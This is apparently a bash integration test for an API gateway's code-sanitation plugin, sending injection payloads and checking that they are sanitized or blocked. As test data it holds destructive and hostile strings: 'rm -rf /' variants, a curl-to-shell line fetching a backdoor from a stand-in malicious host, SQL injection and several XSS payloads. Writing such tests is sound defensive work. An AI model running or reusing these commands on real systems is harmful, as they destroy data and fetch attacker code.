#!/bin/bash

# Colors for output
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'

# Use environment variables or defaults
ADMIN_URL=${ADMIN_URL:-"http://localhost:8080/api/v1"}
PROXY_URL=${PROXY_URL:-"http://localhost:8081"}
BASE_DOMAIN=${BASE_DOMAIN:-"example.com"}
SUBDOMAIN="codesanit-$(date +%s)"

echo -e "${GREEN}Testing Code Sanitation Plugin${NC}\n"

# 1. Create a gateway with code sanitation plugin
echo -e "${GREEN}1. Creating gateway with code sanitation plugin...${NC}"
GATEWAY_RESPONSE=$(curl -s -X POST "$ADMIN_URL/gateways" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Code Sanitation Gateway",
    "subdomain": "'$SUBDOMAIN'"
}')

# Extract gateway details
GATEWAY_ID=$(echo $GATEWAY_RESPONSE | jq -r '.id')
SUBDOMAIN=$(echo $GATEWAY_RESPONSE | jq -r '.subdomain')

if [ "$GATEWAY_ID" == "null" ] || [ -z "$GATEWAY_ID" ]; then
    echo -e "${RED}Failed to create gateway. Response: $GATEWAY_RESPONSE${NC}"
    exit 1
fi

echo "Gateway created with ID: $GATEWAY_ID"

# Create API key
echo -e "\n${GREEN}2. Creating API key...${NC}"
API_KEY_RESPONSE=$(curl -s -X POST "$ADMIN_URL/gateways/$GATEWAY_ID/keys" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Test Key",
    "expires_at": "2026-01-01T00:00:00Z"
}')

API_KEY=$(echo $API_KEY_RESPONSE | jq -r '.key')

if [ "$API_KEY" == "null" ] || [ -z "$API_KEY" ]; then
    echo -e "${RED}Failed to create API key. Response: $API_KEY_RESPONSE${NC}"
    exit 1
fi

echo "API Key created: $API_KEY"

# Create upstream
echo -e "\n${GREEN}3. Creating upstream...${NC}"
UPSTREAM_RESPONSE=$(curl -s -X POST "$ADMIN_URL/gateways/$GATEWAY_ID/upstreams" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "echo-upstream-'$(date +%s)'",
    "algorithm": "round-robin",
    "targets": [{
        "host": "localhost",
        "port": 8081,
        "protocol": "http",
        "path": "/__/mirror",
        "weight": 100,
        "priority": 1
    }],
    "health_checks": {
        "passive": true,
        "threshold": 3,
        "interval": 60
    }
}')

UPSTREAM_ID=$(echo $UPSTREAM_RESPONSE | jq -r '.id')

if [ "$UPSTREAM_ID" == "null" ] || [ -z "$UPSTREAM_ID" ]; then
    echo -e "${RED}Failed to create upstream. Response: $UPSTREAM_RESPONSE${NC}"
    exit 1
fi

echo "Upstream created with ID: $UPSTREAM_ID"

# Create service
echo -e "\n${GREEN}4. Creating service...${NC}"
SERVICE_RESPONSE=$(curl -s -X POST "$ADMIN_URL/gateways/$GATEWAY_ID/services" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "echo-service-'$(date +%s)'",
    "type": "upstream",
    "description": "Echo test service",
    "upstream_id": "'$UPSTREAM_ID'"
}')

SERVICE_ID=$(echo $SERVICE_RESPONSE | jq -r '.id')

if [ "$SERVICE_ID" == "null" ] || [ -z "$SERVICE_ID" ]; then
    echo -e "${RED}Failed to create service. Response: $SERVICE_RESPONSE${NC}"
    exit 1
fi

echo "Service created with ID: $SERVICE_ID"

# Create rule for testing
echo -e "\n${GREEN}5. Creating rule for testing...${NC}"
RULE_RESPONSE=$(curl -s -X POST "$ADMIN_URL/gateways/$GATEWAY_ID/rules" \
  -H "Content-Type: application/json" \
  -d '{
    "path": "/sanitize",
    "service_id": "'$SERVICE_ID'",
    "methods": ["POST"],
    "strip_path": false,
    "active": true,
    "plugin_chain": [
        {
            "name": "code_sanitation",
            "enabled": true,
            "stage": "pre_request",
            "priority": 1,
            "settings": {
                "languages": [
                    {
                        "language": "javascript",
                        "enabled": true
                    },
                    {
                        "language": "python",
                        "enabled": true
                    },
                    {
                        "language": "php",
                        "enabled": true
                    },
                    {
                        "language": "sql",
                        "enabled": true
                    },
                    {
                        "language": "shell",
                        "enabled": true
                    }
                ],
                "content_to_check": ["headers", "path_and_query", "body"],
                "action": "block",
                "status_code": 400,
                "error_message": "Potential code injection detected",
                "sanitize_char": "X"
            }
        }
    ]
}')

# Test sanitize action first
echo -e "\n${GREEN}6. Testing code sanitation with sanitize action...${NC}"

# Test JavaScript injection with sanitize
echo -e "\n${GREEN}6.1 Testing JavaScript injection (should be sanitized)...${NC}"
RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/sanitize" \
    -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
    -H "X-API-Key: ${API_KEY}" \
    -H "Content-Type: application/json" \
    -d '{
        "code": "function malicious() { eval(\"alert(1)\"); }"
    }')

BODY=$(echo "$RESPONSE" | sed '$d')
HTTP_CODE=$(echo "$RESPONSE" | grep "STATUS_CODE:" | cut -d':' -f2)

if [ "$HTTP_CODE" == "200" ] && echo "$BODY" | grep -q "XX"; then
    echo -e "${GREEN}Success! JavaScript code was sanitized with 'X' characters.${NC}"
else
    echo -e "${RED}Unexpected response! HTTP $HTTP_CODE${NC}"
    echo -e "${RED}Expected sanitized content with 'X' characters not found in response.${NC}"
fi

# Test Python injection with sanitize
echo -e "\n${GREEN}6.2 Testing Python injection (should be sanitized)...${NC}"
RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/sanitize" \
    -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
    -H "X-API-Key: ${API_KEY}" \
    -H "Content-Type: application/json" \
    -d '{
        "code": "import os; os.system(\"rm -rf /\")"
    }')

BODY=$(echo "$RESPONSE" | sed '$d')
HTTP_CODE=$(echo "$RESPONSE" | grep "STATUS_CODE:" | cut -d':' -f2)
echo "BODY: $BODY"
echo "HTTP_CODE: $HTTP_CODE"

if [ "$HTTP_CODE" == "200" ] && echo "$BODY" | grep -q "XX"; then
    echo -e "${GREEN}Success! Python code was sanitized with 'X' characters.${NC}"
else
    echo -e "${RED}Unexpected response! HTTP $HTTP_CODE${NC}"
    echo -e "${RED}Expected sanitized content with 'X' characters not found in response.${NC}"
fi

# Test SQL injection
echo -e "\n${GREEN}6.3 Testing SQL injection (should be sanitized)...${NC}"
RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/sanitize" \
    -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
    -H "X-API-Key: ${API_KEY}" \
    -H "Content-Type: application/json" \
    -d '{
        "query": "SELECT * FROM users WHERE username = \"admin\" OR 1=1"
    }')

BODY=$(echo "$RESPONSE" | sed '$d')
HTTP_CODE=$(echo "$RESPONSE" | grep "STATUS_CODE:" | cut -d':' -f2)

if [ "$HTTP_CODE" == "200" ]; then
    echo -e "${GREEN}Success! SQL injection was sanitized.${NC}"
else
    echo -e "${RED}Unexpected response! HTTP $HTTP_CODE${NC}"
fi

# Test Shell injection
echo -e "\n${GREEN}6.4 Testing Shell injection (should be sanitized)...${NC}"
RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/sanitize" \
    -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
    -H "X-API-Key: ${API_KEY}" \
    -H "Content-Type: application/json" \
    -d '{
        "command": "rm -rf / || curl http://malicious.com/backdoor.sh | sh"
    }')

# Extract body and status code from response
BODY=$(echo "$RESPONSE" | sed '$d')
HTTP_CODE=$(echo "$RESPONSE" | grep "STATUS_CODE:" | cut -d':' -f2)

if [ "$HTTP_CODE" == "200" ]; then
    echo -e "${GREEN}Success! Shell injection was sanitized.${NC}"
else
    echo -e "${RED}Unexpected response! HTTP $HTTP_CODE${NC}"
fi

# Test custom pattern (template injection)
echo -e "\n${GREEN}6.5 Testing template injection (should be sanitized)...${NC}"
RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/sanitize" \
    -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
    -H "X-API-Key: ${API_KEY}" \
    -H "Content-Type: application/json" \
    -d '{
        "template": "Hello {{ user.name }}! Your password is {{ user.password }}"
    }')

# Extract body and status code from response
BODY=$(echo "$RESPONSE" | sed '$d')
HTTP_CODE=$(echo "$RESPONSE" | grep "STATUS_CODE:" | cut -d':' -f2)

if [ "$HTTP_CODE" == "200" ]; then
    echo -e "${GREEN}Success! Template injection was sanitized.${NC}"
else
    echo -e "${RED}Unexpected response! HTTP $HTTP_CODE${NC}"
fi

# Test header injection
echo -e "\n${GREEN}6.6 Testing header injection (should be sanitized)...${NC}"
RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/sanitize" \
    -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
    -H "X-API-Key: ${API_KEY}" \
    -H "Content-Type: application/json" \
    -H "X-Custom-Code: eval(alert(1))" \
    -d '{
        "message": "This is a safe message"
    }')

# Extract body and status code from response
BODY=$(echo "$RESPONSE" | sed '$d')
HTTP_CODE=$(echo "$RESPONSE" | grep "STATUS_CODE:" | cut -d':' -f2)

if [ "$HTTP_CODE" == "200" ]; then
    echo -e "${GREEN}Success! Header injection was sanitized.${NC}"
else
    echo -e "${RED}Unexpected response! HTTP $HTTP_CODE${NC}"
fi

# Test HTML injection
echo -e "\n${GREEN}6.7 Testing HTML injection (should be sanitized)...${NC}"
RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/sanitize" \
    -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
    -H "X-API-Key: ${API_KEY}" \
    -H "Content-Type: application/json" \
    -d '{
        "content": "<script>alert(1)</script>",
        "style": "<style>@import url(evil.css);</style>",
        "frame": "<iframe src=\"javascript:alert(2)\"></iframe>",
        "event": "<img src=x onerror=\"alert(3)\">",
        "data": "<a href=\"data:text/html,<script>alert(4)</script>\">click</a>"
    }')

# Extract body and status code from response
BODY=$(echo "$RESPONSE" | sed '$d')
HTTP_CODE=$(echo "$RESPONSE" | grep "STATUS_CODE:" | cut -d':' -f2)

if [ "$HTTP_CODE" == "200" ]; then
    echo -e "${GREEN}Success! HTML injection was sanitized.${NC}"
else
    echo -e "${RED}Unexpected response! HTTP $HTTP_CODE${NC}"
fi

# # Now test block action
# echo -e "\n${GREEN}7. Testing code sanitation with block action...${NC}"

# # Create a new rule with block action
# echo -e "${GREEN}7.1 Creating rule with block action...${NC}"
# RULE_RESPONSE=$(curl -s -X POST "$ADMIN_URL/gateways/$GATEWAY_ID/rules" \
#   -H "Content-Type: application/json" \
#   -d '{
#     "path": "/block-test",
#     "service_id": "'$SERVICE_ID'",
#     "methods": ["POST"],
#     "strip_path": false,
#     "active": true,
#     "plugin_chain": [
#         {
#             "name": "code_sanitation",
#             "enabled": true,
#             "stage": "pre_request",
#             "priority": 1,
#             "settings": {
#                 "languages": [
#                     {
#                         "language": "javascript",
#                         "enabled": true
#                     }
#                 ],
#                 "content_to_check": ["headers", "path_and_query", "body"],
#                 "action": "block",
#                 "status_code": 400,
#                 "error_message": "Code injection blocked"
#             }
#         }
#     ]
# }')

# # Test JavaScript injection with block
# echo -e "\n${GREEN}7.2 Testing JavaScript injection (should be blocked)...${NC}"
# RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/block-test" \
#     -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
#     -H "X-API-Key: ${API_KEY}" \
#     -H "Content-Type: application/json" \
#     -d '{
#         "code": "function malicious() { eval(\"alert(1)\"); }"
#     }')

# BODY=$(echo "$RESPONSE" | sed '$d')
# HTTP_CODE=$(echo "$RESPONSE" | grep "STATUS_CODE:" | cut -d':' -f2)
# echo "BODY: $BODY"
# echo "HTTP_CODE: $HTTP_CODE"

# if [ "$HTTP_CODE" == "400" ]; then
#     echo -e "${GREEN}Success! JavaScript injection was correctly blocked.${NC}"
# else
#     echo -e "${RED}Unexpected response! HTTP $HTTP_CODE${NC}"
# fi

# # Add a new test for the "apply_all_languages" option
# echo -e "\n${GREEN}8. Testing with apply_all_languages option...${NC}"

# # Create a new rule with apply_all_languages set to true
# echo -e "${GREEN}8.1 Creating rule with apply_all_languages...${NC}"
# ALL_LANG_RULE_RESPONSE=$(curl -s -X POST "$ADMIN_URL/gateways/$GATEWAY_ID/rules" \
#   -H "Content-Type: application/json" \
#   -d '{
#     "path": "/all-lang-test",
#     "service_id": "'$SERVICE_ID'",
#     "methods": ["POST"],
#     "strip_path": false,
#     "active": true,
#     "plugin_chain": [
#         {
#             "name": "code_sanitation",
#             "enabled": true,
#             "stage": "pre_request",
#             "priority": 1,
#             "settings": {
#                 "apply_all_languages": true,
#                 "content_to_check": ["headers", "path_and_query", "body"],
#                 "action": "block",
#                 "status_code": 400,
#                 "error_message": "Code injection detected (all languages mode)"
#             }
#         }
#     ]
# }')

# # Test Java code injection (which wasn't explicitly enabled in the main tests)
# echo -e "\n${GREEN}8.2 Testing Java injection with apply_all_languages (should be blocked)...${NC}"
# RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/all-lang-test" \
#     -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
#     -H "X-API-Key: ${API_KEY}" \
#     -H "Content-Type: application/json" \
#     -d '{
#         "code": "Runtime.getRuntime().exec(\"rm -rf /\");"
#     }')

# # Extract body and status code from response
# BODY=$(echo "$RESPONSE" | sed '$d')
# HTTP_CODE=$(echo "$RESPONSE" | grep "STATUS_CODE:" | cut -d':' -f2)
# echo "BODY: $BODY"
# echo "HTTP_CODE: $HTTP_CODE"

# if [ "$HTTP_CODE" == "400" ]; then
#     echo -e "${GREEN}Success! Java injection was correctly blocked with apply_all_languages.${NC}"
# else
#     echo -e "${RED}Unexpected response! HTTP $HTTP_CODE${NC}"
#     echo -e "${RED}Java injection was not blocked as expected.${NC}"
# fi

# # Test Ruby code injection (which wasn't explicitly enabled in the main tests)
# echo -e "\n${GREEN}8.3 Testing Ruby injection with apply_all_languages (should be blocked)...${NC}"
# RESPONSE=$(curl -s -w "\nSTATUS_CODE:%{http_code}" "$PROXY_URL/all-lang-test" \
#     -H "Host: ${SUBDOMAIN}.${BASE_DOMAIN}" \
#     -H "X-API-Key: ${API_KEY}" \
#     -H "Content-Type: application/json" \
#     -d '{
#         "code": "eval(\"puts `rm -rf /`\")"
#     }')

# # Extract body and status code from response
# BODY=$(echo "$RESPONSE" | sed '$d')
# HTTP_CODE=$(echo "$RESPONSE" | grep "STATUS_CODE:" | cut -d':' -f2)

# if [ "$HTTP_CODE" == "400" ]; then
#     echo -e "${GREEN}Success! Ruby injection was correctly blocked with apply_all_languages.${NC}"
# else
#     echo -e "${RED}Unexpected response! HTTP $HTTP_CODE${NC}"
#     echo -e "${RED}Ruby injection was not blocked as expected.${NC}"
# fi

echo -e "\n${GREEN}Code sanitation tests completed${NC}"